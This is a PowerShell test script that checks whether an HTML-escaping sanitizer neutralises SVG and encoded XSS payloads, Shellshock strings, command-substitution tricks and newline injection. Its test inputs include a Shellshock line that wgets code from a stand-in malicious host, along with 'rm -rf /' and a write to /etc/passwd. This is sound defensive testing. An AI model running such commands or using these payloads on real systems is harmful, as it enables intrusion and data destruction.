###############################################################
#
## Copyright (©) 2024-2025 David H Hoyt. All rights reserved.
##                 https://srd.cx
##
## Last Updated:  16-DEC-2025-2025 1400Z by David Hoyt
#
## Intent:test-xss-extended-signatures.ps1
#
#
#
#
#
#
#
#
#
#
#
###############################################################

$ErrorActionPreference = 'Stop'

# Test counters
$script:TestsRun = 0
$script:TestsPassed = 0
$script:TestsFailed = 0

# Simple sanitize functions for testing (PowerShell versions)
function Sanitize-Line {
  param([string]$Input)
  
  # Remove control characters
  $result = $Input -replace "`r", "" -replace "`n", " "
  $result = $result -replace "[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]", ""
  
  # Trim whitespace
  $result = $result.Trim()
  
  # Escape HTML entities
  $result = $result -replace "&", "&amp;"
  $result = $result -replace "<", "&lt;"
  $result = $result -replace ">", "&gt;"
  $result = $result -replace '"', "&quot;"
  $result = $result -replace "'", "&#39;"
  
  # Truncate if too long
  if ($result.Length -gt 1000) {
    $result = $result.Substring(0, 997) + "..."
  }
  
  return $result
}

# Helper to run a test
function Run-Test {
  param(
    [string]$TestName,
    [string]$Input,
    [string]$FunctionName,
    [string]$ExpectedBehavior
  )
  
  $script:TestsRun++
  
  # Run sanitization
  $actual = switch ($FunctionName) {
    'sanitize_line' { Sanitize-Line $Input }
    default { throw "Unknown function: $FunctionName" }
  }
  
  # Check that dangerous patterns are escaped/removed
  $safe = $true
  $issues = @()
  
  # Check for unescaped HTML tags
  if ($actual -match '<[a-zA-Z]') {
    $safe = $false
    $issues += 'unescaped-tags'
  }
  
  # Check for unescaped script patterns
  if ($actual -match '(?i)(<script|javascript:|onerror=|onload=)') {
    $safe = $false
    $issues += 'script-pattern'
  }
  
  # Check for unescaped event handlers
  if ($actual -match 'on[a-z]+=') {
    $safe = $false
    $issues += 'event-handler'
  }
  
  # Check for dangerous control characters
  if ($actual -match '[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]') {
    $safe = $false
    $issues += 'control-chars'
  }
  
  # Check for bash function injection patterns
  if ($actual -match '\(\).*\{.*\}') {
    $safe = $false
    $issues += 'bash-function'
  }
  
  if ($safe) {
    $script:TestsPassed++
    Write-Host "PASS [$script:TestsRun]: $TestName - $ExpectedBehavior" -ForegroundColor Green
  } else {
    $script:TestsFailed++
    Write-Host "FAIL [$script:TestsRun]: $TestName - $ExpectedBehavior" -ForegroundColor Red
    Write-Host "  Issues: $($issues -join ', ')" -ForegroundColor Yellow
    Write-Host "  Input: $($Input.Substring(0, [Math]::Min(100, $Input.Length)))" -ForegroundColor Yellow
    Write-Host "  Output: $($actual.Substring(0, [Math]::Min(100, $actual.Length)))" -ForegroundColor Yellow
  }
}

# Test SVG-based XSS attacks
Write-Host "`n=== Testing SVG XSS Attacks ===" -ForegroundColor Cyan

Run-Test -TestName "svg-onload-alert" `
  -Input '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG XML with onload'

Run-Test -TestName "svg-embedded-script" `
  -Input '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG with embedded script'

Run-Test -TestName "svg-foreignobject" `
  -Input '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG foreignObject with script'

Run-Test -TestName "svg-animate-href" `
  -Input '<svg><animate href="#x" attributeName="href" values="javascript:alert(1)"/></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG animate with javascript href'

Run-Test -TestName "svg-set-attribute" `
  -Input '<svg><set attributeName="onload" to="alert(1)"/></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG set with onload attribute'

Run-Test -TestName "svg-use-xlink" `
  -Input '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"/></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG use with base64 xlink'

# Test encoding fuzzing
Write-Host "`n=== Testing HTML Entity Encoding Fuzzing ===" -ForegroundColor Cyan

Run-Test -TestName "url-encoded-lt" `
  -Input '%3Cscript%3Ealert(1)%3C/script%3E' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle URL-encoded less-than'

Run-Test -TestName "html-entity-lt" `
  -Input '&lt;script&gt;alert(1)&lt;/script&gt;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle HTML entity less-than'

Run-Test -TestName "decimal-entity-lt" `
  -Input '&#60;script&#62;alert(1)&#60;/script&#62;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle decimal entity less-than'

Run-Test -TestName "hex-entity-lt-lowercase" `
  -Input '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle hex entity less-than (lowercase)'

Run-Test -TestName "hex-entity-lt-uppercase" `
  -Input '&#X3C;script&#X3E;alert(1)&#X3C;/script&#X3E;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle hex entity less-than (uppercase)'

Run-Test -TestName "padded-decimal-entity" `
  -Input '&#0000060;script&#0000062;alert(1)&#0000060;/script&#0000062;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle zero-padded decimal entity'

Run-Test -TestName "padded-hex-entity" `
  -Input '&#x000003c;script&#x000003e;alert(1)&#x000003c;/script&#x000003e;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle zero-padded hex entity'

Run-Test -TestName "mixed-case-entity" `
  -Input '&#x3C;ScRiPt&#x3E;alert(1)&#x3C;/ScRiPt&#x3E;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle mixed case with hex entities'

# Test Bash bug injection
Write-Host "`n=== Testing Bash Bug Injection Patterns ===" -ForegroundColor Cyan

Run-Test -TestName "shellshock-basic" `
  -Input '() { :;}; echo vulnerable' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape basic shellshock pattern'

Run-Test -TestName "shellshock-command-injection" `
  -Input '() { :;}; /bin/bash -c "wget http://malicious.com/exploit"' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape shellshock with command injection'

Run-Test -TestName "env-function-injection" `
  -Input "env x='() { :;}; apt-get update && apt-get install --only-upgrade bash' bash -c 'Oops.'" `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape environment function injection'

Run-Test -TestName "bash-func-export" `
  -Input "env 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c 'echo test'" `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape BASH_FUNC export pattern'

Run-Test -TestName "function-definition-exploit" `
  -Input "foo='() { echo 'hi mom'; }' bash -c 'foo'" `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape function definition exploit'

Run-Test -TestName "cookie-shellshock" `
  -Input 'Cookie: () { echo "Hello world"; }' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape cookie-based shellshock'

Run-Test -TestName "nested-command-substitution" `
  -Input '$(echo $(echo vulnerable))' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape nested command substitution'

# Test advanced SVG vectors
Write-Host "`n=== Testing Advanced SVG Attack Vectors ===" -ForegroundColor Cyan

Run-Test -TestName "svg-style-expression" `
  -Input '<svg><style>*{background:url("javascript:alert(1)")}</style></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG style with javascript URL'

Run-Test -TestName "svg-image-href" `
  -Input '<svg><image href="javascript:alert(1)"/></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG image with javascript href'

Run-Test -TestName "svg-a-tag" `
  -Input '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG anchor with javascript'

Run-Test -TestName "svg-handler-element" `
  -Input '<svg xmlns:ev="http://www.w3.org/2001/xml-events"><handler ev:event="load">alert(1)</handler></svg>' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape SVG handler element'

# Test encoding combinations
Write-Host "`n=== Testing Encoding Combination Attacks ===" -ForegroundColor Cyan

Run-Test -TestName "double-encoded-lt" `
  -Input '%253Cscript%253Ealert(1)%253C/script%253E' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle double URL encoding'

Run-Test -TestName "unicode-escape-lt" `
  -Input '\u003cscript\u003ealert(1)\u003c/script\u003e' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle unicode escape sequences'

Run-Test -TestName "utf7-encoded" `
  -Input '+ADw-script+AD4-alert(1)+ADw-/script+AD4-' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle UTF-7 encoding'

Run-Test -TestName "mixed-encoding" `
  -Input '&#60;%73cript>alert(1)&lt;/script&#62;' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should handle mixed encoding techniques'

# Test bash special characters
Write-Host "`n=== Testing Bash Special Character Injection ===" -ForegroundColor Cyan

Run-Test -TestName "backtick-command-sub" `
  -Input '`echo vulnerable`' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape backtick command substitution'

Run-Test -TestName "dollar-paren-command-sub" `
  -Input '$(whoami)' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape $() command substitution'

Run-Test -TestName "pipe-chain" `
  -Input 'echo test | bash | sh' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape pipe chains'

Run-Test -TestName "semicolon-separator" `
  -Input 'echo safe; rm -rf /' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape semicolon command separator'

Run-Test -TestName "ampersand-background" `
  -Input 'sleep 10 & rm -rf /' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape background execution'

Run-Test -TestName "redirect-attack" `
  -Input 'echo pwned > /etc/passwd' `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape redirect operators'

# Test newline injection
Write-Host "`n=== Testing Newline Injection in Bash Context ===" -ForegroundColor Cyan

Run-Test -TestName "lf-command-injection" `
  -Input "safe`nrm -rf /" `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should remove newline command injection (LF)'

Run-Test -TestName "crlf-command-injection" `
  -Input "safe`r`nrm -rf /" `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should remove newline command injection (CRLF)'

Run-Test -TestName "multiline-function" `
  -Input "() {`n:;`n}; echo vulnerable" `
  -FunctionName 'sanitize_line' `
  -ExpectedBehavior 'Should escape multiline bash function'

# Summary
Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "Extended Test Summary:" -ForegroundColor Cyan
Write-Host "  Total tests run: $script:TestsRun" -ForegroundColor White
Write-Host "  Passed: $script:TestsPassed" -ForegroundColor Green
Write-Host "  Failed: $script:TestsFailed" -ForegroundColor $(if ($script:TestsFailed -gt 0) { 'Red' } else { 'Green' })
Write-Host "================================================" -ForegroundColor Cyan

if ($script:TestsFailed -gt 0) {
  Write-Host "`nFAILURE: Some tests failed" -ForegroundColor Red
  exit 1
} else {
  Write-Host "`nSUCCESS: All extended tests passed" -ForegroundColor Green
  exit 0
}
